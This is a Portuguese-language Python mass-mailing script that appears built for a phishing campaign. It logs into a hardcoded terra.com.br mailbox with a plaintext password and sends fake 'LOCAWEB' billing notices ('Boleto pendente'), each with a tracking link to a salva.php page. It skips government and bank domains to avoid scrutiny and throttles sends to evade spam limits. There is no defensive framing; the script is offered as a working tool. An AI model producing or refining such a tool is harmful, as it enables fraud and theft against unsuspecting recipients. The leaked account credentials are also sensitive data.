#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib, uuid, time, random, re, signal, sys
from email.message import EmailMessage
from email.utils import formatdate, make_msgid
from pathlib import Path
import dns.resolver

SMTP_HOST = 'smtp.terra.com.br'
SMTP_PORT = 587
SMTP_USER = 'moreno.julia@terra.com.br'
SMTP_PASS = '102030'
FROM_MAIL = SMTP_USER
FROM_NAME = 'LOCAWEB'
DOMAIN    = 'terra.com.br'

LIST_FILE   = 'lista.txt'
CURSOR_FILE = '.cursor'
DELAY_BASE  = 1.0
DELAY_JIT   = 0.5
BATCH_SIZE  = 5
BATCH_PAUSE = 30

SUBJECTS = ['2ª via disponível', 'Boleto pendente']
EMAIL_RE = re.compile(r'^[^@]+@[^@]+\.[^@]+$')

DOMINIOS_BLOQUEADOS = (
    '.gov.br','.mil.br','.jus.br','bradesco.com.br','itau.com.br',
    'bb.com.br','santander.com.br','caixa.gov.br','mercadolivre.com.br',
    'amazon.com','amazon.com.br','shopee.com.br','magalu.com.br',
    'ifood.com.br','netflix.com'
)

# =========================
# OTIMIZAÇÕES (SEM MUDAR LÓGICA)
# =========================
DNS_CACHE = {}
HTML_CORPO = Path('corpo.html').read_text(encoding='utf-8')

def salvar_cursor(idx):
    Path(CURSOR_FILE).write_text(str(idx))

def carregar_cursor():
    try:
        return int(Path(CURSOR_FILE).read_text())
    except:
        return 0

def email_valido(e):
    if not EMAIL_RE.match(e):
        return False

    dominio = e.split('@')[1]

    if dominio in DNS_CACHE:
        return DNS_CACHE[dominio]

    try:
        dns.resolver.resolve(dominio, 'MX', lifetime=3)
        DNS_CACHE[dominio] = True
        return True
    except:
        DNS_CACHE[dominio] = False
        return False

def dominio_bloqueado(e):
    dominio = e.split('@')[-1].lower()
    return any(dominio.endswith(d) for d in DOMINIOS_BLOQUEADOS)

def corpo(email):
    nome = email.split('@')[0].replace('.', ' ').title()
    link = f"https://bot.atendesjc.com.br/salva.php?id={uuid.uuid4().hex[:8]}"
    return HTML_CORPO.replace('{{NOME}}', nome).replace('{{URL}}', link)

def build_msg(email):
    msg = EmailMessage()
    msg['From'] = f'{FROM_NAME} <{FROM_MAIL}>'
    msg['To'] = email
    msg['Subject'] = random.choice(SUBJECTS)
    msg['Date'] = formatdate(localtime=True)
    msg['Message-ID'] = make_msgid(domain=DOMAIN)
    msg.set_content('Seu cliente de e-mail não suporta HTML.')
    msg.add_alternative(corpo(email), subtype='html')
    return msg.as_bytes()

def envia_1(email):
    if dominio_bloqueado(email):
        return 'BLOQUEADO (domínio recusado)'
    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(SMTP_USER, SMTP_PASS)
            s.sendmail(FROM_MAIL, email, build_msg(email))
            return 'OK ✅'
    except smtplib.SMTPResponseException as e:
        erro = e.smtp_error.decode(errors='ignore') if isinstance(e.smtp_error, bytes) else e.smtp_error
        return f'ERRO SMTP {e.smtp_code} - {erro}'
    except Exception as e:
        return f'ERRO {e}'

def carrega_lista():
    emails = {
        e.strip().lower()
        for e in Path(LIST_FILE).read_text(encoding='utf-8').splitlines()
        if email_valido(e.strip())
    }
    return sorted([e for e in emails if not dominio_bloqueado(e)])

def signal_handler(sig, frame):
    print('\n🛑 Interrompido. Próxima execução continuará do ponto atual.')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print('🔍 Carregando lista...')
    todos = carrega_lista()
    total = len(todos)

    if not total:
        print('❌ Nenhum e-mail válido para enviar.')
        sys.exit(0)

    inicio = carregar_cursor()

    if inicio >= total:
        print('✅ Todos os e-mails já foram processados. Delete .cursor para recomeçar.')
        sys.exit(0)

    print('=' * 60)
    print(f'📤 INICIANDO ENVIO | TOTAL: {total} | INÍCIO: {inicio}')
    print('=' * 60)

    lote_count = 0

    for idx in range(inicio, total):
        email = todos[idx]
        try:
            status = envia_1(email)
        except Exception as e:
            status = f'ERRO FATAL {e}'

        print(f'➡️ {email} → {status}')
        salvar_cursor(idx + 1)

        lote_count += 1
        if lote_count >= BATCH_SIZE:
            print(f'⏸️ Pausa de {BATCH_PAUSE} segundos antes do próximo lote...')
            time.sleep(BATCH_PAUSE)
            lote_count = 0

        time.sleep(random.uniform(DELAY_BASE, DELAY_BASE + DELAY_JIT))

    print('\n🏁 ENVIO FINALIZADO. Delete .cursor para recomeçar.')
